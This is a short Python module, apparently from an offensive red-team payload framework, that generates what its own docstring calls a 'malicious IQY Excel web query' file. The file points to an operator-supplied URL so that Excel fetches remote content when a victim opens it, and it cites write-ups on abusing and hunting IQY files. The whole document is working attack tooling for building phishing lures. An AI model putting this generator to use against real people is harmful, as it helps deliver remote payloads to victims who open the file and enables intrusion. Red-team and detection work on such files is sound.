#!/usr/bin/env python
# encoding: utf-8

import logging

from common.utils import MPParam, getParamValue
from modules.payload_builder import PayloadBuilder

"""

http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html
https://inquest.net/blog/2018/08/23/hunting-iqy-files-with-yara

"""


IQY_TEMPLATE = \
r"""WEB
1
<<<URL>>>
"""



class IqyGenerator(PayloadBuilder):
    """ Module used to generate malicious IQY Excel web query"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(f" [+] Generating {self.outputFileType} file...")        

        paramArray = [MPParam("targetUrl")]
        self.fillInputParams(paramArray)

        # Fill template
        urlContent = IQY_TEMPLATE
        urlContent = urlContent.replace("<<<URL>>>", getParamValue(paramArray, "targetUrl"))

        with open(self.outputFilePath, 'w') as f:
            f.writelines(urlContent)
        logging.info(f"   [-] Generated URL file: {self.outputFilePath}")
        logging.info("   [-] Test with : \n Click on %s file to test.\n" % self.outputFilePath)
        

        
        
        